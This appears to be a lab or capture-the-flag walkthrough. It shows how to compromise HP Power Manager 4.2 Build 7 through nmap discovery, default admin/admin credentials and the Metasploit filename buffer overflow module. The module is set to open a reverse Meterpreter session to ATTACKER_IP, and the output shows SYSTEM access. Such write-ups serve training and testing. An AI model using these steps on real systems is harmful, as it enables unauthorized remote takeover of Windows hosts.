# HP Power Manager

HP Power Manager exposes a GoAhead web interface on HTTP. Version 4.2 Build 7 can be exploited with the Metasploit `hp_power_manager_filename` module to get a SYSTEM Meterpreter session.

## Discovery

```bash
nmap -sC -sV TARGET
# 80/tcp open  http  GoAhead WebServer
# http-server-header: GoAhead-Webs
# http-title: HP Power Manager
# Requested resource was http://TARGET/index.asp
```

The host may be an older Windows system:

```text
445/tcp  open  microsoft-ds  Windows 7 Ultimate N 7600
3389/tcp open  ms-wbt-server Microsoft Terminal Service
```

## Web Login and Version

Browse to:

```text
http://TARGET/index.asp
```

Try default credentials:

```text
Username: admin
Password: admin
```

The version can be found at:

```text
http://TARGET/Contents/index.asp
HP Power Manager 4.2 (Build 7)
```

## Metasploit RCE

Use the HP Power Manager filename buffer overflow module:

```text
use exploit/windows/http/hp_power_manager_filename
set RHOSTS TARGET
set RPORT 80
set VHOST kevin
set LHOST ATTACKER_IP
set LPORT 8080
run
```

Successful output:

```text
[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
[*] Sending stage (...) to TARGET
[*] Meterpreter session opened
```

Confirm access:

```text
meterpreter > sysinfo
Computer        : KEVIN
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
Domain          : WORKGROUP
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## References

- https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
